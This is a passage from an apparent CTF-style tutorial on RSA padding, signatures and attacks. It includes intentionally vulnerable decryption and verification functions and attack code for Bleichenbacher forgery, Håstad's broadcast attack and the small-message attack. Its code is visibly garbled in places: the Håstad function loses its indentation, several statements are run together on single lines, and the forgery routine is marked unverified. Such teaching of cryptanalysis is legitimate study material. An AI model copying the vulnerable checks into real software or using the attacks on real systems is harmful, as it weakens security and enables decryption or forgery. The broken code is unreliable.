    Remove PKCS#1 v1.5 padding manually
    """
    # Check format
    if padded_message[0] != 0x00 or padded_message[1] != 0x02:
        raise ValueError("Invalid PKCS#1 v1.5 padding")
    
    # Find separator (0x00 after padding)
    separator_index = padded_message.index(0x00, 2)
    
    # Extract message
    message = padded_message[separator_index + 1:]
    
    return message

# Example
message = b"Hello"
key_size = 256  # 2048-bit key = 256 bytes

padded = pkcs1_v15_pad(message, key_size)
print(f"Padded length: {len(padded)} bytes")
print(f"Padded (hex): {padded.hex()}")

unpadded = pkcs1_v15_unpad(padded)
assert unpadded == message
print(f"Unpadded: {unpadded}")
```

**Padding Oracle Attack on PKCS#1 v1.5**

[Inference] Bleichenbacher's attack exploits timing differences or error messages that reveal whether padding is valid. This is similar to CBC padding oracles but specific to RSA.

```python
"""
Bleichenbacher's Attack (1998):
- Exploits error messages: "Invalid padding" vs "Decryption failed"
- Allows attacker to decrypt ciphertext without private key
- Requires ~1 million oracle queries for 2048-bit RSA
- Attack works by narrowing down possible plaintext values

Protection:
- Constant-time padding validation
- Same error message for all failures
- Use OAEP instead of PKCS#1 v1.5
"""

# Example vulnerable implementation
def vulnerable_decrypt(ciphertext, private_key):
    """VULNERABLE: Reveals padding validity"""
    try:
        m = pow(ciphertext, private_key.d, private_key.n)
        padded = m.to_bytes(256, 'big')
        
        # Check padding format
        if padded[0] != 0x00 or padded[1] != 0x02:
            raise ValueError("Invalid PKCS#1 v1.5 padding")
        
        # Find separator
        separator = padded.index(0x00, 2)
        message = padded[separator + 1:]
        
        return message
    except ValueError as e:
        # VULNERABILITY: Different error messages
        if "Invalid PKCS#1" in str(e):
            raise Exception("PADDING_ERROR")  # Reveals invalid padding
        else:
            raise Exception("DECRYPTION_ERROR")  # Other error

# Secure implementation
def secure_decrypt(ciphertext, private_key):
    """Secure: Constant-time, generic error"""
    sentinel = b"DECRYPTION_FAILED"
    
    cipher = PKCS1_v1_5.new(private_key)
    plaintext = cipher.decrypt(ciphertext, sentinel)
    
    if plaintext == sentinel:
        # Generic error - doesn't reveal why it failed
        raise Exception("Decryption failed")
    
    return plaintext
```

#### OAEP Padding (Recommended)

**Optimal Asymmetric Encryption Padding**

```python
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA256

# Generate key
key = RSA.generate(2048)

# Create cipher with OAEP (SHA-256 hash)
cipher_encrypt = PKCS1_OAEP.new(key.publickey(), hashAlgo=SHA256)
cipher_decrypt = PKCS1_OAEP.new(key, hashAlgo=SHA256)

# Encrypt
plaintext = b"Secure message with OAEP"
ciphertext = cipher_encrypt.encrypt(plaintext)

print(f"Ciphertext (hex): {ciphertext.hex()}")

# Decrypt
decrypted = cipher_decrypt.decrypt(ciphertext) print(f"Decrypted: {decrypted}")

assert plaintext == decrypted

```

**OAEP Structure**

```

OAEP Format: 0x00 || maskedSeed || maskedDB

Where:

- maskedSeed = seed ⊕ MGF(maskedDB)
- maskedDB = DB ⊕ MGF(seed)
- DB = lHash || PS || 0x01 || M
- lHash = Hash(label)
- PS = padding string of 0x00 bytes
- MGF = Mask Generation Function (typically MGF1 with SHA-256)

Security benefits:

- Randomized (different ciphertext each time)
- Provably secure under random oracle model
- Resistant to padding oracle attacks
- No exploitable structure

````

**Manual OAEP Implementation**

```python
from Crypto.Hash import SHA256
import os

def mgf1_sha256(seed, mask_len):
    """
    Mask Generation Function 1 with SHA-256
    """
    hash_len = 32  # SHA-256 output length
    output = b""
    
    counter = 0
    while len(output) < mask_len:
        h = SHA256.new()
        h.update(seed + counter.to_bytes(4, 'big'))
        output += h.digest()
        counter += 1
    
    return output[:mask_len]

def oaep_encode(message, key_size_bytes, label=b""):
    """
    Encode message with OAEP padding
    """
    hash_len = 32  # SHA-256 output
    
    # Calculate lengths
    max_msg_len = key_size_bytes - 2 * hash_len - 2
    
    if len(message) > max_msg_len:
        raise ValueError("Message too long")
    
    # lHash = SHA-256(label)
    lHash = SHA256.new(label).digest()
    
    # PS = padding string (0x00 bytes)
    ps_len = key_size_bytes - len(message) - 2 * hash_len - 2
    PS = b'\x00' * ps_len
    
    # DB = lHash || PS || 0x01 || M
    DB = lHash + PS + b'\x01' + message
    
    # Generate random seed
    seed = os.urandom(hash_len)
    
    # maskedDB = DB ⊕ MGF(seed)
    dbMask = mgf1_sha256(seed, len(DB))
    maskedDB = bytes([db ^ mask for db, mask in zip(DB, dbMask)])
    
    # maskedSeed = seed ⊕ MGF(maskedDB)
    seedMask = mgf1_sha256(maskedDB, hash_len)
    maskedSeed = bytes([s ^ mask for s, mask in zip(seed, seedMask)])
    
    # EM = 0x00 || maskedSeed || maskedDB
    encoded = b'\x00' + maskedSeed + maskedDB
    
    return encoded

def oaep_decode(encoded, label=b""):
    """
    Decode OAEP padded message
    """
    hash_len = 32  # SHA-256 output
    
    # Split components
    if encoded[0] != 0x00:
        raise ValueError("Invalid OAEP padding")
    
    maskedSeed = encoded[1:hash_len + 1]
    maskedDB = encoded[hash_len + 1:]
    
    # Recover seed
    seedMask = mgf1_sha256(maskedDB, hash_len)
    seed = bytes([ms ^ mask for ms, mask in zip(maskedSeed, seedMask)])
    
    # Recover DB
    dbMask = mgf1_sha256(seed, len(maskedDB))
    DB = bytes([mdb ^ mask for mdb, mask in zip(maskedDB, dbMask)])
    
    # Extract lHash, PS, and message
    lHash_received = DB[:hash_len]
    lHash_expected = SHA256.new(label).digest()
    
    if lHash_received != lHash_expected:
        raise ValueError("Invalid OAEP padding (label mismatch)")
    
    # Find 0x01 separator
    separator_index = DB.index(0x01, hash_len)
    message = DB[separator_index + 1:]
    
    return message

# Example usage
message = b"Test OAEP"
key_size = 256  # bytes (2048-bit)

encoded = oaep_encode(message, key_size)
print(f"OAEP encoded length: {len(encoded)} bytes")

decoded = oaep_decode(encoded)
print(f"Decoded message: {decoded}")

assert message == decoded
````

#### Hybrid Encryption (RSA + AES)

**Practical Encryption Pattern**

```python
"""
[Inference] RSA is slow and can only encrypt small messages.
For larger data, use hybrid encryption:

1. Generate random AES key
2. Encrypt data with AES (fast, unlimited size)
3. Encrypt AES key with RSA (small, secure key exchange)
4. Transmit: RSA(AES_key) || AES(data)
"""

from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes

def hybrid_encrypt(plaintext, rsa_public_key):
    """
    Encrypt large data using RSA + AES hybrid scheme
    """
    # Generate random AES-256 key
    aes_key = get_random_bytes(32)
    
    # Encrypt plaintext with AES-GCM
    aes_cipher = AES.new(aes_key, AES.MODE_GCM)
    ciphertext, tag = aes_cipher.encrypt_and_digest(plaintext)
    nonce = aes_cipher.nonce
    
    # Encrypt AES key with RSA-OAEP
    rsa_cipher = PKCS1_OAEP.new(rsa_public_key)
    encrypted_aes_key = rsa_cipher.encrypt(aes_key)
    
    # Package: RSA(key) || nonce || tag || AES(data)
    return {
        'encrypted_key': encrypted_aes_key,
        'nonce': nonce,
        'tag': tag,
        'ciphertext': ciphertext
    }

def hybrid_decrypt(encrypted_data, rsa_private_key):
    """
    Decrypt hybrid encrypted data
    """
    # Decrypt AES key with RSA
    rsa_cipher = PKCS1_OAEP.new(rsa_private_key)
    aes_key = rsa_cipher.decrypt(encrypted_data['encrypted_key'])
    
    # Decrypt data with AES-GCM
    aes_cipher = AES.new(aes_key, AES.MODE_GCM, nonce=encrypted_data['nonce'])
    plaintext = aes_cipher.decrypt_and_verify(
        encrypted_data['ciphertext'],
        encrypted_data['tag']
    )
    
    return plaintext

# Example
key = RSA.generate(2048)
large_plaintext = b"A" * 100000  # 100KB data

print(f"Plaintext size: {len(large_plaintext)} bytes")

# Encrypt
encrypted = hybrid_encrypt(large_plaintext, key.publickey())
print(f"Encrypted AES key: {len(encrypted['encrypted_key'])} bytes")
print(f"Encrypted data: {len(encrypted['ciphertext'])} bytes")

# Decrypt
decrypted = hybrid_decrypt(encrypted, key)
print(f"Decrypted size: {len(decrypted)} bytes")

assert decrypted == large_plaintext
```

#### Converting Between Formats

**Bytes ↔ Integer ↔ Text**

```python
def bytes_to_int(data):
    """Convert bytes to integer"""
    return int.from_bytes(data, 'big')

def int_to_bytes(num, length=None):
    """Convert integer to bytes"""
    if length is None:
        # Calculate minimum required length
        length = (num.bit_length() + 7) // 8
    return num.to_bytes(length, 'big')

def text_to_int(text):
    """Convert text to integer via UTF-8 encoding"""
    return bytes_to_int(text.encode('utf-8'))

def int_to_text(num):
    """Convert integer to text via UTF-8 decoding"""
    byte_data = int_to_bytes(num)
    return byte_data.decode('utf-8')

# Example
text = "Hello"
print(f"Text: {text}")

# Text → Bytes → Integer
text_bytes = text.encode('utf-8')
text_int = bytes_to_int(text_bytes)
print(f"As integer: {text_int}")
print(f"As hex: {hex(text_int)}")

# Encrypt integer
n = 3233
e = 17
ciphertext = pow(text_int, e, n)
print(f"Ciphertext: {ciphertext}")

# Decrypt
d = 2753
decrypted_int = pow(ciphertext, d, n)
print(f"Decrypted int: {decrypted_int}")

# Integer → Bytes → Text
decrypted_bytes = int_to_bytes(decrypted_int)
decrypted_text = decrypted_bytes.decode('utf-8')
print(f"Decrypted text: {decrypted_text}")

assert text == decrypted_text
```

**Hex and Base64 Encoding**

```python
import base64

def encrypt_and_encode(plaintext, e, n, encoding='hex'):
    """
    Encrypt plaintext and encode result
    """
    # Convert to integer
    m = bytes_to_int(plaintext.encode('utf-8'))
    
    # Encrypt
    c = pow(m, e, n)
    
    # Convert to bytes
    c_bytes = int_to_bytes(c)
    
    # Encode
    if encoding == 'hex':
        return c_bytes.hex()
    elif encoding == 'base64':
        return base64.b64encode(c_bytes).decode('ascii')
    else:
        return c_bytes

def decode_and_decrypt(encoded_ciphertext, d, n, encoding='hex'):
    """
    Decode and decrypt ciphertext
    """
    # Decode
    if encoding == 'hex':
        c_bytes = bytes.fromhex(encoded_ciphertext)
    elif encoding == 'base64':
        c_bytes = base64.b64decode(encoded_ciphertext)
    else:
        c_bytes = encoded_ciphertext
    
    # Convert to integer
    c = bytes_to_int(c_bytes)
    
    # Decrypt
    m = pow(c, d, n)
    
    # Convert to bytes and decode
    plaintext_bytes = int_to_bytes(m)
    return plaintext_bytes.decode('utf-8')

# Example with real key
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

key = RSA.generate(2048)

# Manual encryption
plaintext = "Secret"
m = bytes_to_int(plaintext.encode('utf-8'))
c = pow(m, key.e, key.n)

# Encode as hex
c_hex = int_to_bytes(c).hex()
print(f"Ciphertext (hex): {c_hex[:64]}...")

# Encode as base64
c_b64 = base64.b64encode(int_to_bytes(c)).decode('ascii')
print(f"Ciphertext (base64): {c_b64[:64]}...")
```

---

### Digital Signatures

#### RSA Signature Scheme

**Mathematical Foundation**

```
RSA Signing (private key operation):
    signature = message_hash^d mod n

RSA Verification (public key operation):
    message_hash = signature^e mod n
    
If recovered hash matches computed hash of message, signature is valid.

Note: Sign with PRIVATE key, verify with PUBLIC key
(Opposite of encryption: encrypt with public, decrypt with private)
```

**Basic Signature Implementation**

```python
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA256
from Crypto.Signature import pkcs1_15

# Generate key pair
key = RSA.generate(2048)

# Message to sign
message = b"This is an important message"

# Create hash of message
hash_obj = SHA256.new(message)

# Sign the hash
signature = pkcs1_15.new(key).sign(hash_obj)

print(f"Message: {message}")
print(f"Signature length: {len(signature)} bytes")
print(f"Signature (hex): {signature.hex()[:64]}...")

# Verification
try:
    # Create new hash of message
    verify_hash = SHA256.new(message)
    
    # Verify signature with public key
    pkcs1_15.new(key.publickey()).verify(verify_hash, signature)
    print("Signature is valid ✓")
except (ValueError, TypeError):
    print("Signature is invalid ✗")

# Test with modified message
modified_message = b"This is a different message"
modified_hash = SHA256.new(modified_message)

try:
    pkcs1_15.new(key.publickey()).verify(modified_hash, signature)
    print("Modified message verified (shouldn't happen!)")
except (ValueError, TypeError):
    print("Modified message rejected ✓")
```

**PKCS#1 v1.5 Signature Padding**

```
Signature Padding Format:
0x00 || 0x01 || PS || 0x00 || DigestInfo

Components:
- 0x00: Leading byte
- 0x01: Block type for signing (0x01, not 0x02)
- PS: Padding string (0xFF bytes, fills to key size)
- 0x00: Separator
- DigestInfo: ASN.1 structure containing hash algorithm ID and hash value

DigestInfo for SHA-256:
30 31 30 0d 06 09 60 86 48 01 65 03 04 02 01 05 00 04 20 [32-byte hash]
```

**Manual Signature Creation**

```python
from Crypto.Hash import SHA256
from Crypto.PublicKey import RSA

def create_signature_manual(message, private_key):
    """
    Create RSA signature manually (educational purposes)
    """
    # Hash the message
    hash_obj = SHA256.new(message)
    hash_bytes = hash_obj.digest()
    
    # DigestInfo for SHA-256 (ASN.1 encoding)
    digest_info = (
        b'\x30\x31'  # SEQUENCE, length 49
        b'\x30\x0d'  # SEQUENCE, length 13
        b'\x06\x09'  # OBJECT IDENTIFIER, length 9
        b'\x60\x86\x48\x01\x65\x03\x04\x02\x01'  # SHA-256 OID
        b'\x05\x00'  # NULL
        b'\x04\x20'  # OCTET STRING, length 32
        + hash_bytes
    )
    
    # Calculate padding
    key_size = private_key.size_in_bytes()
    ps_len = key_size - len(digest_info) - 3
    
    if ps_len < 8:
        raise ValueError("Key too small for signature")
    
    # Create padded message: 0x00 || 0x01 || PS || 0x00 || DigestInfo
    padded = b'\x00\x01' + (b'\xff' * ps_len) + b'\x00' + digest_info
    
    # Convert to integer
    m = int.from_bytes(padded, 'big')
    
    # Sign: s = m^d mod n
    signature_int = pow(m, private_key.d, private_key.n)
    
    # Convert to bytes
    signature = signature_int.to_bytes(key_size, 'big')
    
    return signature

def verify_signature_manual(message, signature, public_key):
    """
    Verify RSA signature manually
    """
    # Convert signature to integer
    s = int.from_bytes(signature, 'big')
    
    # Verify: m = s^e mod n
    m = pow(s, public_key.e, public_key.n)
    
    # Convert to bytes
    key_size = public_key.size_in_bytes()
    padded = m.to_bytes(key_size, 'big')
    
    # Check padding format
    if padded[0] != 0x00 or padded[1] != 0x01:
        return False
    
    # Find separator
    try:
        sep_index = padded.index(0x00, 2)
    except ValueError:
        return False
    
    # Check padding bytes are all 0xFF
    if not all(b == 0xFF for b in padded[2:sep_index]):
        return False
    
    # Extract DigestInfo
    digest_info_received = padded[sep_index + 1:]
    
    # Compute expected DigestInfo
    hash_obj = SHA256.new(message)
    digest_info_expected = (
        b'\x30\x31\x30\x0d\x06\x09\x60\x86\x48\x01\x65\x03\x04\x02\x01'
        b'\x05\x00\x04\x20' + hash_obj.digest()
    )
    
    # Compare
    return digest_info_received == digest_info_expected

# Example
key = RSA.generate(2048)
message = b"Sign this message"

signature = create_signature_manual(message, key)
print(f"Signature created: {signature.hex()[:64]}...")

is_valid = verify_signature_manual(message, signature, key.publickey())
print(f"Signature valid: {is_valid}")

# Test with wrong message
is_valid_wrong = verify_signature_manual(b"Wrong message", signature, key.publickey())
print(f"Wrong message valid: {is_valid_wrong}")
```

#### PSS Signatures (Recommended)

**Probabilistic Signature Scheme**

```python
from Crypto.Signature import pss
from Crypto.Hash import SHA256
from Crypto.PublicKey import RSA

# Generate key
key = RSA.generate(2048)

# Message to sign
message = b"Message with PSS signature"

# Create hash
hash_obj = SHA256.new(message)

# Sign with PSS (randomized, more secure)
signature = pss.new(key).sign(hash_obj)

print(f"PSS Signature length: {len(signature)} bytes")
print(f"PSS Signature (hex): {signature.hex()[:64]}...")

# Verify
try:
    verify_hash = SHA256.new(message)
    pss.new(key.publickey()).verify(verify_hash, signature)
    print("PSS signature valid ✓")
except (ValueError, TypeError):
    print("PSS signature invalid ✗")

# Key difference: PSS signatures are different each time (randomized)
sig1 = pss.new(key).sign(SHA256.new(message))
sig2 = pss.new(key).sign(SHA256.new(message))

print(f"\nSignature 1: {sig1.hex()[:32]}...")
print(f"Signature 2: {sig2.hex()[:32]}...")
print(f"Different: {sig1 != sig2}")  # True - PSS is randomized
```

**PSS vs PKCS#1 v1.5**

```python
"""
PKCS#1 v1.5 Signatures:
- Deterministic (same signature every time)
- Proven attacks exist in specific scenarios
- Still widely used (backwards compatibility)

PSS (Probabilistic Signature Scheme):
- Randomized (different signature each time)
- Provably secure under random oracle model
- Recommended for new implementations
- Resistant to signature forgery attacks

[Inference] PSS provides better security guarantees
"""

from Crypto.Signature import pkcs1_15, pss
from Crypto.Hash import SHA256
from Crypto.PublicKey import RSA

key = RSA.generate(2048)
message = b"Compare signature schemes"

# PKCS#1 v1.5 - deterministic
hash1 = SHA256.new(message)
sig_pkcs_1 = pkcs1_15.new(key).sign(hash1)

hash2 = SHA256.new(message)
sig_pkcs_2 = pkcs1_15.new(key).sign(hash2)

print("PKCS#1 v1.5 (deterministic):")
print(f"Signature 1 == Signature 2: {sig_pkcs_1 == sig_pkcs_2}")

# PSS - randomized
hash3 = SHA256.new(message)
sig_pss_1 = pss.new(key).sign(hash3)

hash4 = SHA256.new(message)
sig_pss_2 = pss.new(key).sign(hash4)

print("\nPSS (randomized):")
print(f"Signature 1 == Signature 2: {sig_pss_1 == sig_pss_2}")
```

#### OpenSSL Signature Operations

```bash
# Create signature with private key
echo "Message to sign" > message.txt

openssl dgst -sha256 -sign private_key.pem -out signature.bin message.txt

# Verify signature with public key
openssl dgst -sha256 -verify public_key.pem -signature signature.bin message.txt
# Output: Verified OK

# Sign with specific algorithm
openssl dgst -sha512 -sign private_key.pem -out signature.bin message.txt

# Base64 encode signature
openssl dgst -sha256 -sign private_key.pem message.txt | base64 > signature.b64

# Verify base64 encoded signature
base64 -d signature.b64 | openssl dgst -sha256 -verify public_key.pem -signature /dev/stdin message.txt

# Extract signature in hex
xxd -p signature.bin | tr -d '\n'
```

#### Signature Forgery Attacks

**Bleichenbacher's Signature Forgery (PKCS#1 v1.5)**

```python
"""
[Inference] Bleichenbacher's Low-Exponent Signature Forgery (2006)

Vulnerability: Insufficient checking of PKCS#1 v1.5 padding
Attack: If verifier doesn't check all padding bytes, attacker can forge signatures

Requirements:
- Low public exponent (e=3)
- Lax padding validation
- Large key size

Exploit constructs: 0x00 || 0x01 || FF...FF || 0x00 || DigestInfo || GARBAGE
Where GARBAGE fills remaining space and cube root yields valid signature
"""

def forge_signature_low_exponent(message, public_key):
    """
    [Unverified] Demonstration of Bleichenbacher forgery concept
    Requires vulnerable verifier that doesn't check all padding
    """
    if public_key.e != 3:
        raise ValueError("Attack requires e=3")
    
    from Crypto.Hash import SHA256
    
    # Create DigestInfo
    hash_bytes = SHA256.new(message).digest()
    digest_info = (
        b'\x30\x31\x30\x0d\x06\x09\x60\x86\x48\x01\x65\x03\x04\x02\x01'
        b'\x05\x00\x04\x20' + hash_bytes
    )
    
    # Construct forged message: 0x00 || 0x01 || FF || 0x00 || DigestInfo || GARBAGE
    # Goal: Find value whose cube gives this structure
    
    forged = b'\x00\x01\xff\x00' + digest_info
    
    # Pad to 1/3 of key size (rest will be "garbage" after cubing)
    key_size = public_key.size_in_bytes()
    target_len = key_size // 3 + 1
    forged += b'\x00' * (target_len - len(forged))
    
    # Convert to integer and compute cube root
    forged_int = int.from_bytes(forged, 'big')
    
    # Compute integer cube root
    def integer_cube_root(n):
        """Compute integer cube root"""
        low, high = 0, n
        while low < high:
            mid = (low + high + 1) // 2
            if mid ** 3 <= n:
                low = mid
            else:
                high = mid - 1
        return low
    
    signature_int = integer_cube_root(forged_int << (8 * (key_size - target_len)))
    
    # Add 1 to ensure cube gives our target value
    signature_int += 1
    
    signature = signature_int.to_bytes(key_size, 'big')
    
    return signature

# Vulnerable verification (doesn't check all padding)
def vulnerable_verify(message, signature, public_key):
    """
    VULNERABLE: Doesn't verify all padding bytes
    """
    from Crypto.Hash import SHA256
    
    # "Decrypt" signature
    s_int = int.from_bytes(signature, 'big')
    m_int = pow(s_int, public_key.e, public_key.n)
    
    key_size = public_key.size_in_bytes()
    padded = m_int.to_bytes(key_size, 'big')
    
    # VULNERABILITY: Only checks start of padding
    if padded[0] != 0x00 or padded[1] != 0x01:
        return False
    
    # VULNERABILITY: Doesn't verify all 0xFF bytes
    # Just looks for 0x00 separator
    try:
        sep_index = padded.index(0x00, 2)
    except ValueError:
        return False
    
    # Extract DigestInfo (may include garbage at end)
    digest_info = padded[sep_index + 1:sep_index + 1 + 51]  # SHA-256 DigestInfo is 51 bytes
    
    # Compute expected
    expected = (
        b'\x30\x31\x30\x0d\x06\x09\x60\x86\x48\x01\x65\x03\x04\x02\x01'
        b'\x05\x00\x04\x20' + SHA256.new(message).digest()
    )
    
    return digest_info == expected
```

**Secure Verification**

```python
def secure_verify(message, signature, public_key):
    """
    Secure signature verification - checks ALL bytes
    """
    from Crypto.Hash import SHA256
    
    s_int = int.from_bytes(signature, 'big')
    m_int = pow(s_int, public_key.e, public_key.n)
    
    key_size = public_key.size_in_bytes()
    try:
        padded = m_int.to_bytes(key_size, 'big')
    except OverflowError:
        return False
    
    # Check format
    if len(padded) != key_size:
        return False
    
    if padded[0] != 0x00 or padded[1] != 0x01:
        return False
    
    # Find separator
    try:
        sep_index = padded.index(0x00, 2)
    except ValueError:
        return False
    
    # Verify ALL padding bytes are 0xFF
    if not all(b == 0xFF for b in padded[2:sep_index]):
        return False
    
    # Verify minimum padding length (at least 8 bytes)
    if sep_index < 10:  # 2 + 8 minimum padding
        return False
    
    # Extract DigestInfo (must be exact, no trailing data)
    digest_info = padded[sep_index + 1:]
    
    # Compute expected DigestInfo
    expected = (
        b'\x30\x31\x30\x0d\x06\x09\x60\x86\x48\x01\x65\x03\x04\x02\x01'
        b'\x05\x00\x04\x20' + SHA256.new(message).digest()
    )
    
    # Must match exactly (no garbage allowed)
    return digest_info == expected
```

---

### Small Exponent Attacks (e=3)

#### Broadcast Attack (Håstad's Attack)

**Attack Concept**

```
Scenario: Same message M sent to 3+ recipients with e=3

Given:
- C₁ = M³ mod n₁
- C₂ = M³ mod n₂  
- C₃ = M³ mod n₃

If M³ < n₁ × n₂ × n₃ (message is small), attacker can:
1. Use Chinese Remainder Theorem to find M³ mod (n₁ × n₂ × n₃)
2. Compute cube root of M³ to recover M

No private key needed!
```

**Implementation**

```python
def chinese_remainder_theorem(remainders, moduli):
    """
    Solve system of congruences:
    x ≡ r₁ (mod n₁)
    x ≡ r₂ (mod n₂)
    x ≡ r₃ (mod n₃)
    """
    total = 0
    prod = 1
    for modulus in moduli:
        prod *= modulus
    
    for remainder, modulus in zip(remainders, moduli):
        p = prod // modulus
        total += remainder * mod_inverse(p, modulus) * p
    
    return total % prod

def mod_inverse(a, m):
    """Extended Euclidean Algorithm for modular inverse"""
    def extended_gcd(a, b):
        if a == 0:
            return b, 0, 1
        gcd, x1, y1 = extended_gcd(b % a, a)
        x = y1 - (b // a) * x1
        y = x1
        return gcd, x, y
    
    gcd, x, _ = extended_gcd(a % m, m)
    if gcd != 1:
        raise ValueError("Modular inverse does not exist")
    return (x % m + m) % m

def integer_cube_root(n):
    """Compute integer cube root"""
    if n == 0:
        return 0
    
    # Binary search
    low, high = 0, n
    while low < high:
        mid = (low + high + 1) // 2
        if mid ** 3 <= n:
            low = mid
        else:
            high = mid - 1
    
    return low

def hastad_broadcast_attack(ciphertexts, moduli, e=3):
    """
    Perform Håstad's broadcast attack
    
    Args:
        ciphertexts: List of ciphertexts [C₁, C₂, C₃, ...]
        moduli: List of moduli [n₁, n₂, n₃, ...]
        e: Public exponent (default 3)
    
    Returns:
        Recovered plaintext or None
    """
    if len(ciphertexts) < e:
        raise ValueError(f"Need at least {e} ciphertexts for e={e}")
    
    # Use first e ciphertexts
    c_list = ciphertexts[:e]
    n_list = moduli[:e]

# Apply Chinese Remainder Theorem
M_to_e = chinese_remainder_theorem(c_list, n_list)

# Compute e-th root
if e == 3:
    M = integer_cube_root(M_to_e)
else:
    # General case: compute e-th root
    M = int(M_to_e ** (1/e))

# Verify correctness
if M ** e == M_to_e:
    return M

# Try M+1 (rounding errors)
if (M + 1) ** e == M_to_e:
    return M + 1

return None

# Example: Håstad's attack simulation

from Crypto.PublicKey import RSA from Crypto.Random import get_random_bytes

# Generate 3 different RSA key pairs (all with e=3)

keys = [RSA.generate(1024, e=3) for _ in range(3)]

# Small message (will fit in cube)

plaintext = b"SECRET" m = int.from_bytes(plaintext, 'big')

print(f"Original message: {plaintext}") print(f"As integer: {m}") print(f"Message cubed: {m**3}")

# Encrypt same message with all 3 public keys

ciphertexts = [pow(m, 3, key.n) for key in keys] moduli = [key.n for key in keys]

print(f"\nEncrypted to 3 recipients (e=3 each):") for i, (c, n) in enumerate(zip(ciphertexts, moduli)): print(f"Recipient {i+1}: C={c}, n={n}")

# Check if M³ < n₁ × n₂ × n₃

product_of_moduli = moduli[0] * moduli[1] * moduli[2] print(f"\nM³ < n₁×n₂×n₃: {m**3 < product_of_moduli}")

# Perform attack

recovered_m = hastad_broadcast_attack(ciphertexts, moduli, e=3)

if recovered_m: recovered_bytes = recovered_m.to_bytes((recovered_m.bit_length() + 7) // 8, 'big') print(f"\n[ATTACK SUCCESS]") print(f"Recovered integer: {recovered_m}") print(f"Recovered message: {recovered_bytes}") assert recovered_bytes == plaintext else: print("\n[ATTACK FAILED]")
````

**CTF Challenge Pattern**

```python
"""
Common CTF scenario:
- Given: 3+ ciphertexts of same message
- Given: 3+ public keys (n, e=3)
- Find: Original plaintext

Example file format:
n1 = 12345...
e1 = 3
c1 = 67890...

n2 = 23456...
e2 = 3
c2 = 78901...

n3 = 34567...
e3 = 3
c3 = 89012...
"""

def solve_ctf_broadcast(data_file):
    """
    Parse CTF challenge file and perform attack
    """
    # Parse file (adjust format as needed)
    ciphertexts = []
    moduli = []
    
    with open(data_file, 'r') as f:
        content = f.read()
    
    # Extract values (example parsing)
    import re
    
    n_values = re.findall(r'n\d+\s*=\s*(\d+)', content)
    c_values = re.findall(r'c\d+\s*=\s*(\d+)', content)
    e_values = re.findall(r'e\d+\s*=\s*(\d+)', content)
    
    moduli = [int(n) for n in n_values]
    ciphertexts = [int(c) for c in c_values]
    e = int(e_values[0]) if e_values else 3
    
    print(f"Found {len(ciphertexts)} ciphertexts with e={e}")
    
    # Perform attack
    recovered = hastad_broadcast_attack(ciphertexts, moduli, e)
    
    if recovered:
        # Try to decode as bytes
        try:
            plaintext = recovered.to_bytes((recovered.bit_length() + 7) // 8, 'big')
            print(f"Plaintext (bytes): {plaintext}")
            
            # Try UTF-8 decode
            try:
                text = plaintext.decode('utf-8')
                print(f"Plaintext (text): {text}")
            except UnicodeDecodeError:
                print("Not valid UTF-8")
        except OverflowError:
            print(f"Plaintext (integer): {recovered}")
    else:
        print("Attack failed")
    
    return recovered
````

#### Coppersmith's Attack (Small Message)

**Attack Concept**

```
[Inference] When e is small (e=3) and message M is small:

If M < n^(1/e), then M^e < n
Therefore: C = M^e mod n = M^e (no modular reduction occurs)

Attack: Simply compute e-th root of C to recover M

Example with e=3:
If M < n^(1/3) and C = M³ mod n
Then C = M³ (since M³ < n)
Therefore M = ∛C
```

**Implementation**

```python
def small_message_attack(ciphertext, n, e=3):
    """
    Attack when message is smaller than n^(1/e)
    """
    # Check if simple root extraction works
    if e == 3:
        m = integer_cube_root(ciphertext)
    else:
        # General e-th root (may have precision issues)
        m = int(ciphertext ** (1/e))
    
    # Verify
    if pow(m, e, n) == ciphertext:
        print(f"[SUCCESS] Small message attack worked")
        return m
    
    # Try m+1 (rounding errors)
    if pow(m + 1, e, n) == ciphertext:
        print(f"[SUCCESS] Small message attack worked (with adjustment)")
        return m + 1
    
    print(f"[FAILED] Message not small enough")
    return None

# Example
from Crypto.PublicKey import RSA

key = RSA.generate(2048, e=3)

# Small message (much less than n^(1/3))
small_plaintext = b"Hi"
m = int.from_bytes(small_plaintext, 'big')

print(f"Message: {small_plaintext}")
print(f"M as integer: {m}")
print(f"n^(1/3): {int(key.n ** (1/3))}")
print(f"M < n^(1/3): {m < key.n ** (1/3)}")

# Encrypt
c = pow(m, 3, key.n)
print(f"\nCiphertext: {c}")
print(f"M³ (no modulus): {m ** 3}")
print(f"C == M³: {c == m ** 3}")

# Attack
recovered = small_message_attack(c, key.n, e=3)
if recovered:
    recovered_text = recovered.to_bytes((recovered.bit_length() + 7) // 8, 'big')
    print(f"Recovered: {recovered_text}")
    assert recovered_text == small_plaintext
```

**Detection in CTF**

```python
def detect_small_message_vulnerability(n, e, c):
    """
    Check if ciphertext is vulnerable to small message attack
    """
    # Calculate n^(1/e)
    threshold = int(n ** (1/e))
    
    print(f"Public exponent e: {e}")
    print(f"Modulus n: {n}")
    print(f"Threshold n^(1/e): {threshold}")
    print(f"Ciphertext c: {c}")
    
    # If c < n and c looks like it could be a perfect e-th power
    if c < n:
        # Try to extract e-th root
        if e == 3:
            root = integer_cube_root(c)
        else:
            root = int(c ** (1/e))
        
        # Check if it's exact
        if pow(root, e) == c or pow(root + 1, e) == c:
            print(f"\n[VULNERABLE] Ciphertext appears to be a perfect {e}-th power")
            print(f"Likely plaintext: {root}")
            return True
    
    print(f"\n[NOT VULNERABLE] to small message attack")
    return False

# Test
n = 12345678901234567890
e = 3
m = 42
c = m ** 3  # No modular reduction

detect_small_message_vulnerability(n, e, c)
```

#### Franklin-Reiter Related Message Attack

**Attack Concept**

```
[Inference] When two messages are linearly related and encrypted with same (n, e=3):

M₁ and M₂ where M₂ = a×M₁ + b (known a, b)
C₁ = M₁³ mod n
C₂ = M₂³ mod n

Can recover M₁ and M₂ using polynomial GCD
```

**Implementation**

```python
def polynomial_gcd(a, b, n):
    """
    Compute GCD of two polynomials mod n
    [Inference] Used in Franklin-Reiter attack
    """
    while b != 0:
        a, b = b, a % b
    return a.monic()

def franklin_reiter_attack(c1, c2, n, a, b, e=3):
    """
    Attack when M₂ = a×M₁ + b
    
    Args:
        c1: Ciphertext of M₁
        c2: Ciphertext of M₂ = a×M₁ + b
        n: Modulus
        a, b: Known linear relationship constants
